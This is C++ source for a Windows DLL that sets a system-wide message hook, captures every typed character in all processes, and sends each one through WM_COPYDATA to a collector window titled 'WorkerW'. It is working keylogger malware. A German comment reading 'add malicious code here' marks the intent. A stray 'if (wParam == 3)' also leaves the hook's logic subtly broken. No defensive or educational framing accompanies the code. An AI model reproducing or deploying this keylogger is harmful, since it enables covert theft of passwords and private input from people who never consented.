#include "logger.h"

HANDLE g_DllHandle;
HHOOK  g_hMyHook;

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_DllHandle = hModule;
		break;
	}
	return TRUE;
}

void installHook(){
	g_hMyHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, (HINSTANCE)g_DllHandle, 0);
}

void removeHook()
{
	UnhookWindowsHookEx(g_hMyHook);
}

HWND foundHwnd = 0;
BOOL CALLBACK enumWindowsProc(__in  HWND hWnd, __in  LPARAM lParam)
{
	int length = ::GetWindowTextLength(hWnd);
	if (0 == length) return TRUE;
	TCHAR* buffer;
	buffer = new TCHAR[length + 1];
	memset(buffer, 0, (length + 1) * sizeof(TCHAR));

	GetWindowText(hWnd, buffer, length + 1);

	if (wcscmp(buffer, L"WorkerW") == 0){
		foundHwnd = hWnd;
	}


	delete[] buffer;

	return TRUE;
}
HWND getLoaderHwnd()
{
	EnumWindows(enumWindowsProc, NULL);

	return foundHwnd;
}

void sendKey(char key)
{
	HWND hwnd = getLoaderHwnd();

	COPYDATASTRUCT cds;
	cds.dwData = 1;
	cds.cbData = sizeof(char);
	cds.lpData = &key;

	SendMessage(hwnd, WM_COPYDATA, 0, (LPARAM)(LPVOID)&cds);
}

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam)
{
	// TODO: füge schadcode hier hinzu

	if (wParam == 3)

	if (code == HC_ACTION)
	{
		LPMSG pmsg = (LPMSG)lParam;
		if (pmsg->message == WM_CHAR)
		{
			WPARAM key = pmsg->wParam;

			if (isalnum(key) != 0 || key == '\t' || key == ' ' || key == '\n' || key == '\r' || key > 0x20 && key < 0x7e){
				sendKey(key);
			}
		}
	}

	return (CallNextHookEx(g_hMyHook, code, wParam, lParam));
}
